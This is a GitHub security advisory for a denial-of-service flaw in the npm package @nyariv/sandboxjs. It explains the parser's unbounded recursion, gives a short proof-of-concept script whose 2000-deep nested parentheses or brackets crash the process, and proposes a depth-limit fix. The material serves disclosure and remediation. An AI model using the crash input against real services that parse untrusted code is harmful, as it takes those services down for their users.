# [M] SandboxJS: Stack overflow DoS via deeply nested expressions in recursive descent parser

## Summary
Severity: Medium
Advisory: GHSA-8pfc-jjgw-6g26
CVE: CVE-2026-34211
CWE: CWE-674
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-04-03
Source: https://github.com/advisories/GHSA-8pfc-jjgw-6g26
Type: github-advisory

## Affected
- npm: `@nyariv/sandboxjs` — affected >=0 <0.8.36

## Details
## Summary

The `@nyariv/sandboxjs` parser contains unbounded recursion in the `restOfExp` function and the `lispify`/`lispifyExpr` call chain. An attacker can crash any Node.js process that parses untrusted input by supplying deeply nested expressions (e.g., ~2000 nested parentheses), causing a `RangeError: Maximum call stack size exceeded` that terminates the process.

## Details

The root cause is in `src/parser.ts`. The `restOfExp` function (line 443) iterates through expression characters, and when it encounters a closing bracket that doesn't match the expected `firstOpening`, it recursively calls itself at line 503:

```typescript
// src/parser.ts:486-505
} else if (closings[char]) {
  // ...
  if (char === firstOpening) {
    done = true;
    break;
  } else {
    const skip = restOfExp(constants, part.substring(i + 1), [], char);  // line 503
    cache.set(skip.start - 1, skip.end);
    i += skip.length + 1;
  }
}
```

Each nested bracket (`(`, `[`, `{`) adds a stack frame. There is no depth counter or limit check. The function signature has no depth parameter:

```typescript
export function restOfExp(
  constants: IConstants,
  part: CodeString,
  tests?: RegExp[],
  quote?: string,
  firstOpening?: string,
  closingsTests?: RegExp[],
  details: restDetails = {},
): CodeString {
```

A second unbounded recursive path exists through `lispify` → `lispTypes.get(type)` → `group` handler → `lispifyExpr` (line 672) → `lispify`, which processes parenthesized groups recursively with no depth limit.

All public API methods (`Sandbox.parse()`, `Sandbox.compile()`, `Sandbox.compileAsync()`, `Sandbox.compileExpression()`, `Sandbox.compileExpressionAsync()`) pass user input directly to `parse()` with no input validation or depth limiting.

A `RangeError: Maximum call stack size exceeded` in Node.js is not a catchable exception in the normal sense — it crashes the current execution context and, in a server handling requests synchronously, can crash the entire process.

## PoC

```bash
# Install the package
npm install @nyariv/sandboxjs

# Create test file
cat > poc.js << 'EOF'
const { default: Sandbox } = require('@nyariv/sandboxjs');
const s = new Sandbox();

// Trigger via nested parentheses
console.log("Testing nested parentheses...");
try {
  s.compile('('.repeat(2000) + '1' + ')'.repeat(2000));
  console.log("No crash");
} catch(e) {
  console.log(`Crash: ${e.constructor.name}: ${e.message}`);
}

// Trigger via nested array brackets
console.log("Testing nested array brackets...");
try {
  s.compile('a' + '[0]'.repeat(2000));
  console.log("No crash");
} catch(e) {
  console.log(`Crash: ${e.constructor.name}: ${e.message}`);
}
EOF

node poc.js
```

**Expected output:**
```
Testing nested parentheses...
Crash: RangeError: Maximum call stack size exceeded
Testing nested array brackets...
Crash: RangeError: Maximum call stack size exceeded
```

Verified on Node.js v22 with `@nyariv/sandboxjs@0.8.35`.

## Impact

Any application using `@nyariv/sandboxjs` to parse untrusted user input is vulnerable to denial of service. Since SandboxJS is explicitly designed to safely execute untrusted JavaScript, its primary use case involves untrusted input — making this a high-impact vulnerability for its intended deployment scenario.

An attacker can crash the host Node.js process with a single crafted input string. In server-side applications, this causes complete service disruption. The attack payload is trivial to construct and requires no authentication.

## Recommended Fix

Add a `depth` parameter to `restOfExp` and throw a `ParseError` when a maximum depth is exceeded:

```typescript
// src/parser.ts - restOfExp function
const MAX_PARSE_DEPTH = 256;

export function restOfExp(
  constants: IConstants,
  part: CodeString,
  tests?: RegExp[],
  quote?: string,
  firstOpening?: string,
  closingsTests?: RegExp[],
  details: restDetails = {},
  depth: number = 0,          // ADD depth parameter
): CodeString {
  if (depth > MAX_PARSE_DEPTH) {
    throw new ParseError('Expression nesting depth exceeded', part.toString());
  }
  // ... existing code ...

  // At line 503, pass depth + 1:
  const skip = restOfExp(constants, part.substring(i + 1), [], char, undefined, undefined, {}, depth + 1);

  // At line 480 (template literal), also pass depth + 1:
  const skip = restOfExp(constants, part.substring(i + 2), [], '{', undefined, undefined, {}, depth + 1);
}
```

Similarly, add depth tracking to `lispify` and `lispifyExpr`:

```typescript
function lispify(
  constants: IConstants,
  part: CodeString,
  expected?: readonly string[],
  lispTree?: Lisp,
  topLevel = false,
  depth: number = 0,         // ADD depth parameter
): Lisp {
  if (depth > MAX_PARSE_DEPTH) {
    throw new ParseError('Expression nesting depth exceeded', part.toString());
  }
  // ... pass depth + 1 to recursive lispify/lispifyExpr calls ...
}
```

## References
- https://github.com/nyariv/SandboxJS/security/advisories/GHSA-8pfc-jjgw-6g26
- https://nvd.nist.gov/vuln/detail/CVE-2026-34211
- https://github.com/nyariv/SandboxJS
